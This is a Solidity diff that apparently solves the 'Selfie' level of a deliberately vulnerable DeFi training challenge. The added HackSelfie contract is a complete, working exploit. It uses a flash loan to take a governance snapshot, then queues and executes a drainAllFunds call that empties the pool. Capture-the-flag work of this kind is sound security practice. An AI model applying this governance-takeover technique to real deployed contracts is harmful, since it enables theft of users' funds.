@@ -56,3 +56,36 @@ contract SelfiePool is ReentrancyGuard {
         emit FundsDrained(receiver, amount);
     }
 }
+
+contract HackSelfie {
+    SelfiePool public pool; 
+    SimpleGovernance public governance; 
+    DamnValuableTokenSnapshot public token; 
+
+    uint public actionId; 
+
+    constructor(address _pool, address _governance, address tokenAddress) {
+        pool  = SelfiePool(_pool); 
+        governance = SimpleGovernance(_governance);
+        token = DamnValuableTokenSnapshot(tokenAddress);
+    }
+
+    fallback() external { 
+        token.snapshot();
+        token.transfer(address(pool), token.balanceOf(address(this)));
+    }
+
+    function exploit() public { 
+        uint borrowAmount = token.balanceOf(address(pool));
+        pool.flashLoan(borrowAmount);
+        actionId = governance.queueAction(
+            address(pool), 
+            abi.encodeWithSignature("drainAllFunds(address)", msg.sender),
+            0
+        );
+    }
+
+    function exploitAgain() public { 
+        governance.executeAction(actionId);
+    }
+}
